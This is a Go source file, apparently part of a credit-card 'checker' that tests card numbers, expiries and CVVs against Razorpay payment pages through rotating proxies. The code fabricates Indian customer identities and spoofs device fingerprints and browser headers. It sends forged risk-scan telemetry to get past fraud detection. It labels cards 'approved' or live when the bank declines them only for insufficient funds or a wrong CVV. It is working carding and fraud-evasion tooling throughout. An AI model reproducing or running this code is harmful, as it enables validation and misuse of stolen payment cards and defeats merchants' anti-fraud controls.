	if zeroDec[strings.ToUpper(currency)] {
		return int64(math.Round(amount))
	}
	return int64(math.Round(amount * 100))
}

func extractSiteCurrency(initData map[string]interface{}) string {
	if pl, ok := initData["payment_link"].(map[string]interface{}); ok {
		if cur := getStringFromMap(pl, "currency"); cur != "" {
			return strings.ToUpper(cur)
		}
	}
	return findCurrencyRecursive(initData, 0)
}

func findCurrencyRecursive(m map[string]interface{}, depth int) string {
	if depth > 4 || m == nil {
		return ""
	}
	if cur := getStringFromMap(m, "currency"); len(cur) == 3 {
		return strings.ToUpper(cur)
	}
	for _, v := range m {
		if sub, ok := v.(map[string]interface{}); ok {
			if cur := findCurrencyRecursive(sub, depth+1); cur != "" {
				return cur
			}
		}
	}
	return ""
}

func getExchangeRate(from, to string) (float64, error) {
	if from == to {
		return 1.0, nil
	}
	// Try Frankfurter API first
	apiURL := fmt.Sprintf("https://api.frankfurter.app/latest?from=%s&to=%s", from, to)
	resp, err := sharedHTTPClient.Get(apiURL)
	if err == nil && resp.StatusCode == 200 {
		defer resp.Body.Close()
		var data struct {
			Rates map[string]float64 `json:"rates"`
		}
		if json.NewDecoder(resp.Body).Decode(&data) == nil {
			if rate, ok := data.Rates[to]; ok {
				return rate, nil
			}
		}
	}
	// Fallback: hardcoded approximate rates
	rates := map[string]float64{
		"USD_INR": 83.5, "EUR_INR": 90.2, "GBP_INR": 105.0,
		"INR_USD": 0.012, "INR_EUR": 0.011, "INR_GBP": 0.0095,
	}
	key := from + "_" + to
	if rate, ok := rates[key]; ok {
		return rate, nil
	}
	return 0, fmt.Errorf("exchange rate not found: %s→%s", from, to)
}

// ─────────────────────────────────────────────────────────────────────
//  RISK SCAN EVENT (lumberjack.razorpay.com)
//  REQUIRED — without this Razorpay declines every payment with
//  payment_risk_check_failed
// ─────────────────────────────────────────────────────────────────────

func genRiskScanUUID() string {
	buf := make([]byte, 16)
	rand.Read(buf)
	buf[6] = (buf[6] & 0x0f) | 0x40
	buf[8] = (buf[8] & 0x3f) | 0x80
	return fmt.Sprintf("%x-%x-%x-%x-%x", buf[0:4], buf[4:6], buf[6:8], buf[8:10], buf[10:16])
}

func extractAttrURLs(html, tag, attr string) []string {
	seen := map[string]bool{}
	var result []string
	tagLower := strings.ToLower(tag)
	attrLower := strings.ToLower(attr)
	lowerHTML := strings.ToLower(html)
	searchStr := "<" + tagLower
	idx := 0
	for idx < len(lowerHTML) {
		tagStart := strings.Index(lowerHTML[idx:], searchStr)
		if tagStart == -1 {
			break
		}
		tagStart += idx
		tagEnd := strings.Index(lowerHTML[tagStart:], ">")
		if tagEnd == -1 {
			break
		}
		tagContent := lowerHTML[tagStart : tagStart+tagEnd]
		attrPattern := attrLower + `="`
		attrIdx := strings.Index(tagContent, attrPattern)
		if attrIdx == -1 {
			attrPattern = attrLower + `='`
			attrIdx = strings.Index(tagContent, attrPattern)
		}
		if attrIdx != -1 {
			valStart := attrIdx + len(attrPattern)
			quoteChar := tagContent[attrIdx+len(attrLower)+1]
			valEnd := strings.IndexByte(tagContent[valStart:], quoteChar)
			if valEnd != -1 {
				val := html[tagStart+valStart : tagStart+valStart+valEnd]
				if val != "" && !seen[val] {
					seen[val] = true
					result = append(result, val)
				}
			}
		}
		idx = tagStart + tagEnd + 1
	}
	return result
}

func sendRiskScanEvent(fetch *CustomFetch, kyid, pageURL, pageHTML string) error {
	if pageURL == "" {
		return errors.New("empty page URL")
	}
	parsedURL, err := url.Parse(pageURL)
	if err != nil {
		return err
	}
	hostname := parsedURL.Hostname()

	scriptURLs := extractAttrURLs(pageHTML, "script", "src")
	iframeURLs := extractAttrURLs(pageHTML, "iframe", "src")
	formURLs := extractAttrURLs(pageHTML, "form", "action")

	if len(scriptURLs) == 0 {
		scriptURLs = []string{
			"https://checkout.razorpay.com/v1/checkout.js",
			"https://cdn.razorpay.com/static/cx/razorpay-risk-detection/bundle.js",
		}
	}

	sid := genRiskScanUUID()
	lumberjackURL := "https://lumberjack.razorpay.com/v2/logz"
	if kyid != "" {
		lumberjackURL = "https://lumberjack.razorpay.com/v2/m/logz?key_id=" + url.QueryEscape(kyid)
	}

	headers := map[string]string{
		"Content-Type":     "application/json",
		"Content-Encoding": "gzip",
		"Accept":           "*/*",
		"Origin":           "https://pages.razorpay.com",
		"Referer":          pageURL,
		"Sec-Fetch-Dest":   "empty",
		"Sec-Fetch-Mode":   "cors",
		"Sec-Fetch-Site":   "cross-site",
	}

	events := []struct {
		name  string
		delay time.Duration
	}{
		{"risk:risk_scan", 0},
		{"risk:risk_mutation", 300 * time.Millisecond},
		{"risk:risk_scan_complete", 1500 * time.Millisecond},
	}

	baseTime := time.Now().UnixMilli()
	for _, ev := range events {
		if ev.delay > 0 {
			time.Sleep(ev.delay)
		}
		now := baseTime + ev.delay.Milliseconds()
		payload := map[string]interface{}{
			"target": "risk-detection.v1.live",
			"events": []map[string]interface{}{{
				"timestamp":       now,
				"source":          "checkoutjs",
				"event_name":      ev.name,
				"event_timestamp": now,
				"properties": map[string]interface{}{
					"sc": scriptURLs, "if": iframeURLs, "fm": formURLs,
					"v": "1.0.0", "u": pageURL, "h": hostname, "r": pageURL, "s": sid,
				},
				"event_type": "risk-detection",
				"version":    "v1",
				"mode":       "live",
			}},
			"addons": map[string]interface{}{
				"merchant_id": "properties.m",
				"ip":          "context.ip",
				"ua":          "context.ua",
			},
		}
		payloadBytes, _ := json.Marshal(payload)
		var compressed bytes.Buffer
		gw := gzip.NewWriter(&compressed)
		gw.Write(payloadBytes)
		gw.Close()
		fetch.DoFetch(lumberjackURL, "POST", headers, bytes.NewReader(compressed.Bytes()))
	}
	return nil
}

// ─────────────────────────────────────────────────────────────────────
//  URL BUILDER HELPERS
// ─────────────────────────────────────────────────────────────────────

// buildQuery builds a URL query string from alternating key/value pairs,
// skipping empty values (so key_id= is never sent for keyless flow)
func buildQuery(pairs ...string) string {
	v := url.Values{}
	for i := 0; i+1 < len(pairs); i += 2 {
		if pairs[i+1] != "" {
			v.Set(pairs[i], pairs[i+1])
		}
	}
	return v.Encode()
}

// addKeyIDForm adds key_id to form values ONLY if it's non-empty
func addKeyIDForm(form url.Values, kyid string) {
	if kyid != "" {
		form.Set("key_id", kyid)
	}
}

func generateAcceptLanguage() string {
	langs := []string{
		"en-IN,en-GB;q=0.9,en;q=0.8,hi;q=0.7",
		"en-IN,en;q=0.9",
		"en-GB,en-IN;q=0.9,en;q=0.8",
	}
	return langs[randInt(0, len(langs)-1)]
}

// ─────────────────────────────────────────────────────────────────────
//  RESPONSE HELPERS
// ─────────────────────────────────────────────────────────────────────

func getStringFromMap(m map[string]interface{}, key string) string {
	if m == nil {
		return ""
	}
	v, ok := m[key]
	if !ok || v == nil {
		return ""
	}
	if s, ok := v.(string); ok {
		return s
	}
	return fmt.Sprintf("%v", v)
}

func getFloatFromMap(m map[string]interface{}, key string) float64 {
	if m == nil {
		return 0
	}
	v, ok := m[key]
	if !ok || v == nil {
		return 0
	}
	switch val := v.(type) {
	case float64:
		return val
	case int:
		return float64(val)
	case string:
		f, _ := strconv.ParseFloat(val, 64)
		return f
	}
	return 0
}

func truncate(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max] + "..."
}

func isHTMLPaymentInProgress(body string, headers http.Header) bool {
	ct := headers.Get("Content-Type")
	if strings.Contains(ct, "text/html") {
		return true
	}
	if strings.Contains(body, "Payment in progress") ||
		strings.Contains(body, "<!DOCTYPE html") ||
		strings.Contains(body, "<html") {
		return true
	}
	return false
}

func extractEmbeddedJSON(html string) map[string]interface{} {
	raw := extractJSONVar(html, "data")
	if raw == "" {
		return nil
	}
	var result map[string]interface{}
	if err := json.Unmarshal([]byte(raw), &result); err != nil {
		return nil
	}
	return result
}

func makeProxyError(err error, proxyRaw string) CheckResult {
	status := classifyProxyError(err)
	if status == "DEAD" {
		markProxyDead(proxyRaw)
	}
	return CheckResult{
		Status:      "error",
		Message:     truncate(err.Error(), 120),
		Proxy:       proxyRaw,
		ProxyStatus: status,
	}
}

func isBalanceKeyword(msg string) bool {
	// Only match description text that clearly = card is live (bank confirmed card, rejected for balance/limit)
	keywords := []string{
		"insufficient funds",
		"insufficient balance",
		"not have enough",
		"exceed your limit",
		"credit limit",
		"daily limit exceeded",
		"payment amount exceeds",
		"exceeds the limit",
		"exceeds withdrawal",
		"exceeds frequency",
		"your account does not have",
	}
	for _, kw := range keywords {
		if strings.Contains(msg, kw) {
			return true
		}
	}
	return false
}

// isApprovedReason checks if the Razorpay "reason" field indicates card is LIVE
// ONLY: bank reached card, verified it, rejected purely for insufficient funds / limit reasons
// Everything else (stolen, blocked, restricted, do_not_honour) = DECLINED
func isApprovedReason(reason string) bool {
	approvedReasons := []string{
		"insufficient_funds",
		"credit_limit_exceeded",
		"credit_limit_expired",
		"credit_limit_inactive",
		"credit_limit_not_approved",
		"transaction_limit_exceeded",
		"daily_limit_exceeded",
		"amount_limit_exceeded",
		"exceeds_withdrawal_amount_limit",
		"exceeds_withdrawal_frequency_limit",
		"amount_less_than_minimum_amount",
		"funds_blocked_by_mandate",
	}
	r := strings.ToLower(strings.TrimSpace(reason))
	for _, ar := range approvedReasons {
		if r == ar {
			return true
		}
	}
	return false
}

// isDeclinedReason checks if reason is a definitive DECLINE
func isDeclinedReason(reason string) bool {
	declinedReasons := []string{
		// ── Risk / Fraud ──
		"payment_risk_check_failed",        // Bank flagged as fraud → DECLINED
		"compliance_violation",
		"payment_blocked_due_to_fraud",
		// ── Generic bank declines ──
		"card_declined",
		"payment_failed",
		"payment_declined",
		"debit_declined",
		"authorization_failed",
		"authorisation_declined_by_psp",
		"do_not_honour",                    // Generic bank decline → DECLINED
		"invalid_transaction",
		"transaction_not_permitted",        // Merchant/card type restriction → DECLINED
		// ── Card status issues ──
		"card_expired",
		"card_not_enrolled",
		"card_disabled_for_online_payments",
		"debit_instrument_inactive",
		"debit_instrument_blocked",
		"card_network_not_enabled",
		"card_type_invalid",
		"card_number_invalid",
		"bank_account_invalid",
		// ── Stolen / restricted ──
		"stolen_card",                      // Card stolen → DECLINED (not live-approved)
		"lost_card",                        // Card lost → DECLINED
		"restricted_card",                  // Restricted by bank → DECLINED
		"account_blocked",                  // Account blocked → DECLINED
		// ── Authentication / OTP failures ──
		"authentication_failed",
		"incorrect_otp",
		"otp_expired",
		"otp_attempts_exceeded",
		"incorrect_pin",
		"incorrect_atm_pin",
		// ── Wrong card details ──
		"incorrect_cvv",                    // CVV wrong → but classified above in isCVVKeyword as APPROVED
		"incorrect_card_details",
		"incorrect_card_expiry_date",
		"incorrect_cardholder_name",
		// ── Network / infra limits (not server errors) ──
		"international_transaction_not_allowed",
		"payment_cancelled",
		"payment_timed_out",
		"issuer_not_available",
		"collect_on_mcc_blocked",
		"bank_not_enabled",                 // Merchant-side issue → DECLINED
	}
	r := strings.ToLower(strings.TrimSpace(reason))
	for _, dr := range declinedReasons {
		if r == dr {
			return true
		}
	}
	return false
}

// isTrueServerError checks if reason is a TRUE infra/gateway error (retry needed, not card's fault)
func isTrueServerError(reason string) bool {
	serverReasons := []string{
		"gateway_technical_error",
		"bank_technical_error",
		"bank_not_available",
		"bank_cutoff_in_progress",
		"capture_failed",
		"deemed_transaction",
		"duplicate_request",
		"duplicate_rrn_found",
		"server_error",
		"payment_processing_failed",    // Razorpay internal processing error
	}
	r := strings.ToLower(strings.TrimSpace(reason))
	for _, sr := range serverReasons {
		if r == sr {
			return true
		}
	}
	return false
}
// classifyResult determines the correct status for a Razorpay error response
// Priority: 1) reason field (most specific) → 2) desc/msg keywords → 3) true server error → 4) declined
func classifyResult(errCode, errDesc, errReason, proxyRaw string) CheckResult {
	label := mapRazorpayCode(errCode, errDesc, errReason)
	msgLower := strings.ToLower(errDesc + " " + errCode)
	r := strings.ToLower(strings.TrimSpace(errReason))

	// 1. Check reason field (most reliable — Razorpay explicit classification)
	if isApprovedReason(r) {
		return CheckResult{Status: "approved", Message: label, Proxy: proxyRaw, ProxyStatus: "LIVE"}
	}
	if isCVVKeyword("", errReason) {
		return CheckResult{Status: "approved", Message: label, Proxy: proxyRaw, ProxyStatus: "LIVE"}
	}
	if isTrueServerError(r) {
		return CheckResult{Status: "error", Message: "Razorpay server error: " + label, Proxy: proxyRaw, ProxyStatus: "LIVE"}
	}
	if isDeclinedReason(r) {
		return CheckResult{Status: "declined", Message: label, Proxy: proxyRaw, ProxyStatus: "LIVE"}
	}

	// 2. Fallback: check description/message text
	if isBalanceKeyword(msgLower) || isCVVKeyword(msgLower, "") {
		return CheckResult{Status: "approved", Message: label, Proxy: proxyRaw, ProxyStatus: "LIVE"}
	}
	if isRazorpayServerError(msgLower) {
		return CheckResult{Status: "error", Message: "Razorpay server error: " + label, Proxy: proxyRaw, ProxyStatus: "LIVE"}
	}

	// 3. Default: declined
	return CheckResult{Status: "declined", Message: label, Proxy: proxyRaw, ProxyStatus: "LIVE"}
}



func isCVVKeyword(msg string, reason string) bool {
	// CVV match = card is LIVE (bank reached it and checked CVV)
	keywords := []string{"cvv", "cvv2", "cvc", "security code", "invalid cvv", "wrong cvv", "incorrect cvv"}
	for _, kw := range keywords {
		if strings.Contains(msg, kw) {
			return true
		}
	}
	// Check reason field from Razorpay
	r := strings.ToLower(strings.TrimSpace(reason))
	return r == "incorrect_cvv" || strings.Contains(r, "cvv")
}

func isRazorpayServerError(s string) bool {
	// Only TRUE infra/network errors — HTTP-level issues, NOT Razorpay decline reasons
	// NOTE: payment_risk_check_failed = bank DECLINED as fraud → NOT a server error
	serverErrors := []string{
		"service unavailable",
		"bad gateway",
		"temporarily unavailable",
		"502", "503", "504",
	}
	for _, e := range serverErrors {
		if strings.Contains(s, e) {
			return true
		}
	}
	return false
}

// mapRazorpayCode converts Razorpay error codes to human-readable decline reasons
func mapRazorpayCode(code, description, reason string) string {
	// If description is clean and meaningful, use it directly
	desc := strings.TrimSpace(strings.ReplaceAll(description,
		" Try another payment method or contact your bank for details.", ""))
	desc = strings.TrimSpace(strings.ReplaceAll(desc,
		" Please try again or use a different payment method.", ""))
	if desc != "" {
		if reason != "" {
			return desc + " (" + reason + ")"
		}
		return desc
	}
	// Fallback: map error code to message
	switch strings.ToUpper(code) {
	case "BAD_REQUEST_ERROR":
		if reason != "" {
			return "Card declined (" + reason + ")"
		}
		return "Invalid card details"
	case "GATEWAY_ERROR":
		if reason != "" {
			return "Gateway declined (" + reason + ")"
		}
		return "Gateway declined"
	case "SERVER_ERROR":
		if reason != "" {
			return "Declined (" + reason + ")"
		}
		return "Declined by issuer"
	default:
		if code != "" {
			return "Declined (" + code + ")"
		}
		return "Declined (no details)"
	}
}

// ─────────────────────────────────────────────────────────────────────
//  MAIN CHECK CARD FUNCTION
// ─────────────────────────────────────────────────────────────────────

func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amountINR float64, currency string, billingLine1Param, billingCityParam, billingStateParam, billingPostalParam string) (result CheckResult) {
	// Normalize expiry to 2-digit year
	yy2 := yy
	if len(yy) == 4 {
		yy2 = yy[2:]
	}

	// Resolve amount/currency
	if amountINR <= 0 {
		amountINR = defaultAmount
	}
	if strings.TrimSpace(currency) == "" {
		currency = defaultCurrency
	}
	currency = strings.ToUpper(strings.TrimSpace(currency))

	requestedAmount := amountINR
	requestedCurrency := currency
	exchangeRateUsed := 0.0
	resolvedAmount := amountINR
	resolvedCurrency := currency

	defer func() {
		result.Amount = resolvedAmount
		result.Currency = resolvedCurrency
		result.RequestedAmount = requestedAmount
		result.RequestedCurrency = requestedCurrency
		result.ExchangeRate = exchangeRateUsed
	}()

	// Randomized user data
	ua := genUA()
	phone := genIndianPhone()
	phoneShort := phone[3:] // strip +91
	email := genEmail()
	fullName := genName()
	billingLine1, billingCity, billingState, billingPostal := genIndianAddress()
	if billingLine1Param != "" {
		billingLine1 = billingLine1Param
	}
	if billingCityParam != "" {
		billingCity = billingCityParam
	}
	if billingStateParam != "" {
		billingState = billingStateParam
	}
	if billingPostalParam != "" {
		billingPostal = billingPostalParam
	}

	rzpDeviceID, fhash := generateRzpDeviceID()
	rzpSessionID := generateRzpSessionID()

	var proxyRaw string
	var proxyParsedURL *url.URL
	if pp != nil {
		proxyRaw = pp.raw
		proxyParsedURL = pp.parsed
	}

	fetch, err := NewCustomFetch(proxyParsedURL, ua, proxyRaw)
	if err != nil {
		return CheckResult{Status: "error", Message: truncate(err.Error(), 120), Proxy: proxyRaw, ProxyStatus: "DEAD"}
	}
	defer fetch.client.CloseIdleConnections()

	// ──────────────────────────────────────────────────────────────────
	// STEP 1: Fetch payment page → extract initData
	// ──────────────────────────────────────────────────────────────────
	initData, proxyStatus, resolveErr := resolveRazorpayInitData(fetch, targetURL, proxyRaw)
	if resolveErr != nil {
		if proxyStatus == "" {
			proxyStatus = "LIVE"
		}
		if proxyStatus == "DEAD" {
			markProxyDead(proxyRaw)
		}
		return CheckResult{Status: "error", Message: resolveErr.Error(), Proxy: proxyRaw, ProxyStatus: proxyStatus}
	}

	// If initData itself is an error response from Razorpay, handle gracefully
	if _, isErr := initData["error_code"]; isErr {
		errMsg := getStringFromMap(initData, "message")
		if errMsg == "" {
			errMsg = fmt.Sprintf("%v", initData["error_code"])
		}
		return CheckResult{Status: "declined", Message: "Page: " + errMsg, Proxy: proxyRaw, ProxyStatus: "LIVE"}
	}
	if errObj, ok := initData["error"].(map[string]interface{}); ok {
		errMsg := getStringFromMap(errObj, "description")
		if errMsg == "" { errMsg = getStringFromMap(errObj, "reason") }
		if errMsg == "" { errMsg = "Page fetch error" }
		return CheckResult{Status: "declined", Message: "Page: " + errMsg, Proxy: proxyRaw, ProxyStatus: "LIVE"}
	}

	// Extract key_id (may be empty for keyless flow)
	kyid := getStringFromMap(initData, "key_id")
	if kyid == "" {
		kyid = getStringFromMap(initData, "key")
	}
	if opts, ok := initData["options"].(map[string]interface{}); ok {
		if kyid == "" {
			kyid = getStringFromMap(opts, "key")
		}
		if kyid == "" {
			kyid = getStringFromMap(opts, "key_id")
		}
	}
	if kyid == "" {
		kyid = getStringFromMap(initData, "merchant_key")
	}

	keylessHeader := getStringFromMap(initData, "keyless_header")

	// Validate: need either key_id or keyless_header
	if kyid == "" && keylessHeader == "" {
		keys := make([]string, 0, len(initData))
		for k := range initData {
			keys = append(keys, k)
		}
		return CheckResult{
			Status:      "error",
			Message:     "Neither key_id nor keyless_header found. Keys: " + strings.Join(keys, ","),
			Proxy:       proxyRaw,
			ProxyStatus: "LIVE",
		}
	}

	keylessHeaderURL := url.QueryEscape(keylessHeader)

	// Extract payment link ID and payment page item ID
	var plink, ppid string
	if plObj, ok := initData["payment_link"].(map[string]interface{}); ok {
		plink = getStringFromMap(plObj, "id")
		if items, ok2 := plObj["payment_page_items"].([]interface{}); ok2 && len(items) > 0 {
			if item, ok3 := items[0].(map[string]interface{}); ok3 {
				ppid = getStringFromMap(item, "id")
			}
		}
	} else if ppObj, ok := initData["payment_page"].(map[string]interface{}); ok {
		plink = getStringFromMap(ppObj, "id")
		if items, ok2 := ppObj["payment_page_items"].([]interface{}); ok2 && len(items) > 0 {
			if item, ok3 := items[0].(map[string]interface{}); ok3 {
				ppid = getStringFromMap(item, "id")
			}
		}
	}
	if plink == "" {
		return CheckResult{Status: "error", Message: "Payment Link ID not found in page data", Proxy: proxyRaw, ProxyStatus: "LIVE"}
	}

	// Currency conversion: site may be INR but user requested USD etc.
	siteCurrency := extractSiteCurrency(initData)
	if siteCurrency != "" && siteCurrency != currency {
		rate, convErr := getExchangeRate(currency, siteCurrency)
		if convErr != nil {
			log.Printf("[currency] %s→%s failed: %v — using original amount", currency, siteCurrency, convErr)
		} else {
			convertedAmount := amountINR * rate
			log.Printf("[currency] %s %.2f → %s %.2f (rate: %.4f)", currency, amountINR, siteCurrency, convertedAmount, rate)
			resolvedAmount = convertedAmount
			resolvedCurrency = siteCurrency
			amountINR = convertedAmount
			currency = siteCurrency
			exchangeRateUsed = rate
		}
	} else if siteCurrency != "" {
		resolvedCurrency = siteCurrency
	}

	forceAmount := toSmallestUnit(amountINR, currency)
	if forceAmount < 1 {
		forceAmount = 100
	}

	// ──────────────────────────────────────────────────────────────────
	// STEP 2: Create order
	// POST api.razorpay.com/v1/payment_pages/<plink>/order
	// ──────────────────────────────────────────────────────────────────
	r2Payload := map[string]interface{}{
		"notes": map[string]string{"comment": "", "name": fullName},
	}
	if ppid != "" {
		r2Payload["line_items"] = []map[string]interface{}{
			{"payment_page_item_id": ppid, "amount": forceAmount},
		}
	}

	r2, err := fetch.PostJSON(
		fmt.Sprintf("https://api.razorpay.com/v1/payment_pages/%s/order", url.PathEscape(plink)),
		map[string]string{
			"Accept":         "application/json, text/plain, */*",
			"Origin":         "https://pages.razorpay.com",
			"Referer":        targetURL,
			"Sec-Fetch-Dest": "empty",
			"Sec-Fetch-Mode": "cors",
			"Sec-Fetch-Site": "same-site",
		},
		r2Payload,
	)
	if err != nil {
		return makeProxyError(err, proxyRaw)
	}
	if r2.StatusCode == 403 || r2.StatusCode == 429 {
		return CheckResult{Status: "error", Message: fmt.Sprintf("WAF blocked order creation (HTTP %d)", r2.StatusCode), Proxy: proxyRaw, ProxyStatus: "BLOCKED"}
	}

	var r2Data map[string]interface{}
	if err := json.Unmarshal(r2.Body, &r2Data); err != nil {
		return CheckResult{Status: "error", Message: "Order response parse failed: " + truncate(err.Error(), 80), Proxy: proxyRaw, ProxyStatus: "LIVE"}
	}

	// Check if Razorpay returned an error response
	if errCode, hasErr := r2Data["error_code"]; hasErr {
		errMsg := getStringFromMap(r2Data, "message")
		if errMsg == "" {
			errMsg = fmt.Sprintf("%v", errCode)
		}
		return CheckResult{Status: "declined", Message: "Order: " + errMsg, Proxy: proxyRaw, ProxyStatus: "LIVE"}
	}
	// Also check nested error object
	if errObj, hasErr := r2Data["error"].(map[string]interface{}); hasErr {
		errMsg := getStringFromMap(errObj, "description")
		if errMsg == "" {
			errMsg = getStringFromMap(errObj, "reason")
		}
		if errMsg == "" {
			errMsg = "Order creation failed"
		}
		return CheckResult{Status: "declined", Message: "Order: " + errMsg, Proxy: proxyRaw, ProxyStatus: "LIVE"}
	}

	orderObj, _ := r2Data["order"].(map[string]interface{})
	if orderObj == nil {
		return CheckResult{Status: "error", Message: "Order object missing in response. Keys: " + func() string {
			ks := make([]string, 0, len(r2Data))
			for k := range r2Data { ks = append(ks, k) }
			return strings.Join(ks, ",")
		}(), Proxy: proxyRaw, ProxyStatus: "LIVE"}
	}
	orderID := getStringFromMap(orderObj, "id")
	if orderID == "" {
		return CheckResult{Status: "error", Message: "Order ID not found", Proxy: proxyRaw, ProxyStatus: "LIVE"}
	}
	orderAmountRaw := getFloatFromMap(orderObj, "amount")
	orderCurrency := strings.ToUpper(getStringFromMap(orderObj, "currency"))
	if orderCurrency == "" {
		orderCurrency = currency
	}

	// Sync resolvedAmount with what the order was actually created for
	if orderAmountRaw > 0 {
		if zeroDec := map[string]bool{"JPY": true, "KRW": true, "VND": true}; zeroDec[orderCurrency] {
			resolvedAmount = orderAmountRaw
		} else {
			resolvedAmount = orderAmountRaw / 100.0
		}
	}
	if exchangeRateUsed == 0 {
		resolvedCurrency = orderCurrency
	}

	// ──────────────────────────────────────────────────────────────────
	// STEP 3: Get checkout session token
	// GET api.razorpay.com/v1/checkout/public
	// ──────────────────────────────────────────────────────────────────
	params3 := url.Values{
		"traffic_env":        {"production"},
		"build":              {BUILD},
		"build_v1":           {BUILD_V1},
		"checkout_v2":        {"1"},
		"new_session":        {"1"},
		"keyless_header":     {keylessHeader},
		"rzp_device_id":      {rzpDeviceID},
		"unified_session_id": {rzpSessionID},
	}

	r3, err := fetch.Get(
		"https://api.razorpay.com/v1/checkout/public?"+params3.Encode(),
		map[string]string{
			"Accept":         "text/html,application/xhtml+xml,*/*",
			"Referer":        targetURL,
			"Sec-Fetch-Dest": "document",
			"Sec-Fetch-Mode": "navigate",
			"Sec-Fetch-Site": "same-site",
		},
	)
	if err != nil {
		return makeProxyError(err, proxyRaw)
	}
	if r3.StatusCode == 403 || r3.StatusCode == 429 {
		return CheckResult{Status: "error", Message: fmt.Sprintf("WAF blocked checkout/public (HTTP %d)", r3.StatusCode), Proxy: proxyRaw, ProxyStatus: "BLOCKED"}
	}

	r3Text := r3.Text()
	sessid := findBetween(r3Text, `window.session_token="`, `";`)
	if sessid == "" {
		if m := sessionTokenRe.FindStringSubmatch(r3Text); len(m) >= 2 {
			sessid = m[1]
		}
	}
	if sessid == "" {
		return CheckResult{Status: "error", Message: "Session token not found in checkout/public response", Proxy: proxyRaw, ProxyStatus: "LIVE"}
	}

	// Build the referer URL that downstream steps use
	rzpRef := fmt.Sprintf("https://api.razorpay.com/v1/checkout/public?traffic_env=production&build=%s&build_v1=%s&checkout_v2=1&new_session=1&unified_session_id=%s&session_token=%s",
		BUILD, BUILD_V1, rzpSessionID, sessid)

	// Generate checkout_id (used in form fields)
	checkoutIDBytes := make([]byte, 7)
	rand.Read(checkoutIDBytes)
	checkoutID := hex.EncodeToString(checkoutIDBytes)

	// Standard headers for all downstream API calls
	stdHeaders := func() map[string]string {
		return map[string]string{
			"Accept":          "*/*",
			"Origin":          "https://api.razorpay.com",
			"Referer":         rzpRef,
			"x-session-token": sessid,
			"Sec-Fetch-Dest":  "empty",
			"Sec-Fetch-Mode":  "cors",
			"Sec-Fetch-Site":  "same-origin",
		}
	}

	// ──────────────────────────────────────────────────────────────────
	// STEP 4: Preferences call (required for session validity)
	// POST api.razorpay.com/v2/standard_checkout/preferences
	// ──────────────────────────────────────────────────────────────────
	{
		resources := []string{
			"checkout_version_config", "merchant", "merchant_features", "downtime",
			"customer", "customer_tokens", "truecaller", "methods", "experiments",
			"offers", "checkout_config", "order", "invoice", "buyer_protection", "personalization",
		}
		queryArr := make([]map[string]string, 0, len(resources))
		for _, r := range resources {
			queryArr = append(queryArr, map[string]string{"resource": r})
		}
		r4Payload := map[string]interface{}{
			"query": queryArr,
			"query_params": map[string]interface{}{
				"device_id":       rzpDeviceID,
				"rtb_device_id":   fhash,
				"amount":          orderAmountRaw,
				"currency":        orderCurrency,
				"option_currency": orderCurrency,
				"truecaller":      false,
				"qr_required":     false,
				"library":         "checkoutjs",
				"platform":        "browser",
				"order_id":        orderID,
				"payment_link_id": plink,
				"contact":         phone,
			},
			"action": "get",
		}
		h := stdHeaders()
		h["Content-Type"] = "application/json"
		prefURL := fmt.Sprintf("https://api.razorpay.com/v2/standard_checkout/preferences?x_entity_id=%s&session_token=%s&keyless_header=%s",
			orderID, sessid, keylessHeaderURL)
		fetch.PostJSON(prefURL, h, r4Payload) // best-effort, response not used
	}

	// ──────────────────────────────────────────────────────────────────
	// STEP 5: Checkout order registration
	// POST api.razorpay.com/v1/standard_checkout/checkout/order
	// ──────────────────────────────────────────────────────────────────
	{
		form5 := url.Values{
			"notes[email]":          {email},
			"notes[phone]":          {phoneShort},
			"payment_link_id":       {plink},
			"contact":               {phone},
			"email":                 {email},
			"currency":              {orderCurrency},
			"_[integration]":        {"payment_pages"},
			"_[device.id]":          {rzpDeviceID},
			"_[library]":            {"checkoutjs"},
			"_[library_src]":        {"no-src"},
			"_[current_script_src]": {"no-src"},
			"_[platform]":           {"browser"},
			"_[env]":                {""},
			"_[is_magic_script]":    {"false"},
			"_[os]":                 {"windows"},
			"_[shield][fhash]":      {fhash},
			"_[shield][tz]":         {"-330"}, // IST UTC+5:30
			"_[device_id]":          {rzpDeviceID},
			"_[build]":              {BUILD},
			"_[shield][os]":         {"windows"},
			"_[shield][platform]":   {"browser"},
			"_[shield][browser]":    {"chrome"},
			"_[request_index]":      {"0"},
			"amount":                {fmt.Sprintf("%.0f", orderAmountRaw)},
			"order_id":              {orderID},
			"method":                {"card"},
			"checkout_id":           {checkoutID},
		}
		addKeyIDForm(form5, kyid)

		h := stdHeaders()
		h["Content-Type"] = "application/x-www-form-urlencoded"
		checkoutOrderURL := "https://api.razorpay.com/v1/standard_checkout/checkout/order?" +
			buildQuery("key_id", kyid, "session_token", sessid, "keyless_header", keylessHeader)
		fetch.PostForm(checkoutOrderURL, h, form5) // best-effort
	}

	// ──────────────────────────────────────────────────────────────────
	// STEP 6: Risk scan events (REQUIRED)
	// POST lumberjack.razorpay.com/v2/m/logz  (gzip JSON)
	// ──────────────────────────────────────────────────────────────────
	// Re-fetch page HTML for risk scanner
	pageHTMLForRisk := ""
	if rRisk, rErr := fetch.Get(targetURL, map[string]string{
		"Accept":                    "text/html,application/xhtml+xml,*/*",
		"Sec-Fetch-Dest":            "document",
		"Sec-Fetch-Mode":            "navigate",
		"Sec-Fetch-Site":            "none",
		"Upgrade-Insecure-Requests": "1",
	}); rErr == nil {
		pageHTMLForRisk = rRisk.Text()
	}
	sendRiskScanEvent(fetch, kyid, targetURL, pageHTMLForRisk)

	// Pre-payment human-like delay (2-4 seconds)
	time.Sleep(time.Duration(randInt(2000, 4000)) * time.Millisecond)

	// ──────────────────────────────────────────────────────────────────
	// STEP 7: Create payment
	// POST api.razorpay.com/v1/standard_checkout/payments/create/checkout
	// ──────────────────────────────────────────────────────────────────
	tokenCreate := base64.StdEncoding.EncodeToString(
		[]byte(`[{"name":"sardine","metadata":{"session_id":"` + checkoutID + `"}}]`),
	)

	form7 := url.Values{
		"user_risk_providers_token":     {tokenCreate},
		"notes[comment]":               {""},
		"notes[email]":                 {email},
		"notes[phone]":                 {phoneShort},
		"notes[name]":                  {fullName},
		"payment_link_id":              {plink},
		"contact":                      {phone},
		"email":                        {email},
		"currency":                     {orderCurrency},
		"_[integration]":               {"payment_pages"},
		"_[checkout_id]":               {checkoutID},
		"_[device.id]":                 {rzpDeviceID},
		"_[env]":                       {""},
		"_[library]":                   {"checkoutjs"},
		"_[library_src]":               {"no-src"},
		"_[current_script_src]":        {"no-src"},
